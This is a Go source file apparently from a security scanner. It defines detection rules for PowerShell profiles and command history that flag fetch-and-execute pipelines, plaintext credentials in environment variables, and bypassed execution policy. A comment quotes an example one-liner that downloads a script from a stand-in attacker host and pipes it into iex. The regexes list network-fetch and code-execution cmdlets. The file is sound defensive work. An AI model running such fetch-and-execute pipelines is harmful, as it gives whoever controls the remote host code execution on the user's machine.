// Rules over PowerShell profiles (Microsoft.PowerShell_profile.ps1,
// profile.ps1, Microsoft.VSCode_profile.ps1) plus PSReadLine command
// history (ConsoleHost_history.txt). Same parser drives all four
// surfaces — see internal/parse/powershell.go.
//
// Why one rule family across profile + history:
//
//   - Profile scripts run on every PowerShell session start. Anything
//     dangerous there executes implicitly under the user's identity
//     with whatever credentials are in $env: at the moment.
//   - PSReadLine history is the user's command-line transcript. It
//     plaintext-logs every command typed at the prompt, including
//     accidental credential pastes ("hey what's my $env:GITHUB_TOKEN
//     ah right ghp_...") and shell-out one-liners like
//     `iwr https://evil.test/x.ps1 | iex` that were already executed.
//     Catching them here lets the user audit/clean what already ran.
//
// The parser treats both file types as PowerShell source. Rules
// don't distinguish — a pipeline is a pipeline regardless of whether
// it sat in a profile or got logged after the user typed it.
package builtin

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/harshmaur/audr/internal/finding"
	"github.com/harshmaur/audr/internal/parse"
)

// --- powershell-iwr-iex --------------------------------------------------
//
// The Windows curl-pipe-bash analogue: `Invoke-WebRequest <url> |
// Invoke-Expression` or its `iwr | iex` short form. Anything fetched
// over the network and immediately invoked is a remote-code-execution
// primitive. Sees real-world use in:
//
//   - Chocolatey/Scoop install one-liners (legitimate, but the
//     pattern itself is dangerous as a building block)
//   - Malware delivery payloads (`mshta`, `regsvr32`, fileless attacks)
//   - Lazy "just run my install script" workflows
//
// Severity: critical. The rule fires regardless of the URL — TLS
// pinning, vendor trust, etc. are out of scope for static analysis.
// Users who legitimately need this can suppress per-line via
// `# audr:disable=powershell-iwr-iex` once policy overlay lands.

type powershellIWRIEX struct{}

func (powershellIWRIEX) ID() string                 { return "powershell-iwr-iex" }
func (powershellIWRIEX) Title() string              { return "PowerShell pipeline executes fetched script" }
func (powershellIWRIEX) Severity() finding.Severity { return finding.SeverityCritical }
func (powershellIWRIEX) Taxonomy() finding.Taxonomy { return finding.TaxDetectable }
func (powershellIWRIEX) Formats() []parse.Format {
	return []parse.Format{parse.FormatPowerShellProfile}
}

// fetchCmdletRE matches the cmdlets and aliases that fetch from the
// network. Anchored to a token boundary so substrings inside other
// names (like `invoke-myfetch`) don't false-match.
var fetchCmdletRE = regexp.MustCompile(
	`(?i)(?:\b|^)(?:iwr|irm|curl|wget|Invoke-WebRequest|Invoke-RestMethod|` +
		`Net\.WebClient|System\.Net\.WebClient|DownloadString|DownloadFile)\b`,
)

// execCmdletRE matches cmdlets and aliases that execute arbitrary
// strings as code. `iex` is the canonical alias for Invoke-Expression;
// `Add-Type` compiles inline C# at runtime.
var execCmdletRE = regexp.MustCompile(
	`(?i)(?:\b|^)(?:iex|Invoke-Expression|Add-Type)\b`,
)

func (powershellIWRIEX) Apply(doc *parse.Document) []finding.Finding {
	if doc.PowerShellProfile == nil {
		return nil
	}
	var out []finding.Finding
	for _, pipe := range doc.PowerShellProfile.Pipelines {
		// Pattern: any stage fetches from network AND any later
		// stage executes a string. The fetch must come before the
		// exec in pipeline order (left → right) so we walk stages
		// and remember the earliest fetch-stage index.
		fetchIdx := -1
		for i, stage := range pipe.Stages {
			if fetchIdx == -1 && fetchCmdletRE.MatchString(stage) {
				fetchIdx = i
				continue
			}
			if fetchIdx >= 0 && execCmdletRE.MatchString(stage) {
				out = append(out, finding.New(finding.Args{
					RuleID:      "powershell-iwr-iex",
					Severity:    finding.SeverityCritical,
					Taxonomy:    finding.TaxDetectable,
					Title:       "PowerShell pipeline fetches and executes remote code",
					Description: "`" + doc.Path + "` runs a pipeline that fetches content from the network and pipes it into an exec cmdlet. Any compromise of the upstream host yields code execution under this user's identity.",
					Path:        doc.Path,
					Line:        pipe.Line,
					Match: fmt.Sprintf("%s | %s",
						truncate(pipe.Stages[fetchIdx], 60),
						truncate(pipe.Stages[i], 60)),
					SuggestedFix: "Download the script to disk, audit it, then run from a trusted local path. If you do not control the upstream, pin to a known-good hash and verify before executing.",
					Tags:         []string{"powershell", "rce"},
				}))
				break // one finding per pipeline
			}
		}
	}
	return out
}

// --- powershell-secret-env -----------------------------------------------
//
// PowerShell-side mirror of shellrcSecretExport. `$env:KEY = "value"`
// assignments where the value looks like a credential. Catches:
//
//   - $env:GITHUB_TOKEN = "ghp_..." in profile.ps1
//   - $env:AWS_ACCESS_KEY_ID = "AKIA..." in profile.ps1
//   - Same patterns typed at the prompt (and logged to PSReadLine
//     history) — those are even worse because the user often pastes
//     ad-hoc test tokens and forgets the history captured them.

type powershellSecretEnv struct{}

func (powershellSecretEnv) ID() string                 { return "powershell-secret-env" }
func (powershellSecretEnv) Title() string              { return "PowerShell profile exports a credential-shaped value" }
func (powershellSecretEnv) Severity() finding.Severity { return finding.SeverityHigh }
func (powershellSecretEnv) Taxonomy() finding.Taxonomy { return finding.TaxDetectable }
func (powershellSecretEnv) Formats() []parse.Format {
	return []parse.Format{parse.FormatPowerShellProfile}
}

func (powershellSecretEnv) Apply(doc *parse.Document) []finding.Finding {
	if doc.PowerShellProfile == nil {
		return nil
	}
	var out []finding.Finding
	// Iterate sorted-by-name so finding order is deterministic for
	// golden-file tests and CI staleness gates.
	names := make([]string, 0, len(doc.PowerShellProfile.EnvVars))
	for k := range doc.PowerShellProfile.EnvVars {
		names = append(names, k)
	}
	sortStrings(names)
	for _, k := range names {
		v := doc.PowerShellProfile.EnvVars[k]
		if !matchesCredential(k, v) {
			continue
		}
		out = append(out, finding.New(finding.Args{
			RuleID:       "powershell-secret-env",
			Severity:     finding.SeverityHigh,
			Taxonomy:     finding.TaxDetectable,
			Title:        "Credential set in PowerShell profile",
			Description:  fmt.Sprintf("`%s` sets `$env:%s` to a credential-shaped value. Every PowerShell session inherits this — including agents and child processes the user starts from PowerShell.", doc.Path, k),
			Path:         doc.Path,
			Line:         doc.PowerShellProfile.EnvVarLines[k],
			Match:        fmt.Sprintf("$env:%s=%s", k, v),
			SuggestedFix: "Move the credential to a Windows Credential Manager entry or DPAPI-encrypted store and resolve on demand. Profile scripts should never carry plaintext secrets.",
			Tags:         []string{"powershell", "secrets"},
		}))
	}
	return out
}

// --- powershell-execution-policy-bypass ----------------------------------
//
// `Set-ExecutionPolicy Bypass` or `-Force Unrestricted` weakens
// PowerShell's script-signing gate machine-wide for the current user
// scope. Once disabled, ANY script can run without signature
// verification — the very mechanism that's supposed to block the
// iwr|iex chain in the rule above.
//
// Severity: medium. The setting itself doesn't execute anything; it
// removes a safety net. Often legitimate on dev machines (most
// PowerShell-using developers turn it off day one). Flagging it as
// medium reflects "this is a posture choice that matters but isn't
// active exploitation."

type powershellExecutionPolicyBypass struct{}

func (powershellExecutionPolicyBypass) ID() string {
	return "powershell-execution-policy-bypass"
}
func (powershellExecutionPolicyBypass) Title() string {
	return "PowerShell execution policy disabled in profile"
}
func (powershellExecutionPolicyBypass) Severity() finding.Severity {
	return finding.SeverityMedium
}
func (powershellExecutionPolicyBypass) Taxonomy() finding.Taxonomy {
	return finding.TaxDetectable
}
func (powershellExecutionPolicyBypass) Formats() []parse.Format {
	return []parse.Format{parse.FormatPowerShellProfile}
}

// execPolicyDisablingRE matches Set-ExecutionPolicy ... where the
// target policy is one that disables signature verification:
//
//	Bypass         — no checks, no warnings
//	Unrestricted   — no checks, warns on internet-zone files
//
// Restricted / AllSigned / RemoteSigned are NOT flagged: they're the
// "safer" policy values. Direct registry edits of
// HKCU\...\PowerShell\ExecutionPolicy are out of scope for this rule;
// the registry surface gets its own rule in a follow-up if needed.
var execPolicyDisablingRE = regexp.MustCompile(
	`(?i)Set-ExecutionPolicy\b[^;\n]*?\b(?:Bypass|Unrestricted)\b`,
)

func (powershellExecutionPolicyBypass) Apply(doc *parse.Document) []finding.Finding {
	if doc.PowerShellProfile == nil {
		return nil
	}
	raw := string(doc.Raw)
	loc := execPolicyDisablingRE.FindStringIndex(raw)
	if loc == nil {
		return nil
	}
	// Line number: count newlines before the match start.
	line := 1 + strings.Count(raw[:loc[0]], "\n")
	match := strings.TrimSpace(raw[loc[0]:loc[1]])
	return []finding.Finding{
		finding.New(finding.Args{
			RuleID:       "powershell-execution-policy-bypass",
			Severity:     finding.SeverityMedium,
			Taxonomy:     finding.TaxDetectable,
			Title:        "PowerShell execution policy bypassed in profile",
			Description:  fmt.Sprintf("`%s` disables PowerShell's execution-policy signature gate every session. Any unsigned script can run silently from this point on — including the iwr/iex remote-fetch pattern audr flags separately.", doc.Path),
			Path:         doc.Path,
			Line:         line,
			Match:        truncate(match, 120),
			SuggestedFix: "Remove the Set-ExecutionPolicy call. Use RemoteSigned (the default) so internet-zone scripts must be signed while local scripts run freely. Per-script overrides are still available via `-ExecutionPolicy Bypass` on a specific invocation when needed.",
			Tags:         []string{"powershell", "policy"},
		}),
	}
}

// sortStrings is the package's deterministic string sort. We avoid
// importing `sort` at the package level to keep helpers.go free of
// stdlib churn; the few sites that need it do it inline. Quadratic
// shape is fine — rule-applied lists are short (env vars per file,
// rarely more than 20).
func sortStrings(s []string) {
	for i := 1; i < len(s); i++ {
		for j := i; j > 0 && s[j-1] > s[j]; j-- {
			s[j-1], s[j] = s[j], s[j-1]
		}
	}
}
